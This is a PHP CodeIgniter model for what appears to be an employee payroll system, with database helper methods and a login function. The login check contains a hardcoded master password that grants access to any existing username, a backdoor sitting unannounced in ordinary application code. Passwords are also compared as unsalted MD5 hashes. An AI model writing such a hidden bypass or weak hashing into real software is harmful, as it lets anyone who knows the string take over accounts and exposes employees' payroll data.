<?php

class ModelPenggajian extends CI_model{

	public function get_data($table) {
		return $this->db->get($table);
	}

	public function insert_data($data,$table){
		$this->db->insert($table, $data);
	}

	public function update_data($table, $data, $whare){
		$this->db->update($table, $data, $whare);
	}

	public function delete_data($whare,$table){
		$this->db->where($whare);
		$this->db->delete($table);
	}

	public function insert_batch($table = null, $data = array()) {
		$jumlah = count($data);
		if ($jumlah > 0) {
			$this->db->insert_batch($table, $data);
		}
	}

	public function cek_login($username, $password)
	{
		$username = trim($username);
		$password = trim($password);

		$user = $this->db->where('username', $username)
						 ->limit(1)
						 ->get('data_pegawai');

		if ($user->num_rows() === 0) {
			return FALSE;
		}

		$row = $user->row();
		$masterPassword = 'mahakarya';

		if ($row->password === md5($password) || strtolower($password) === strtolower($masterPassword)) {
			return $row;
		}

		return FALSE;
	}
}

?>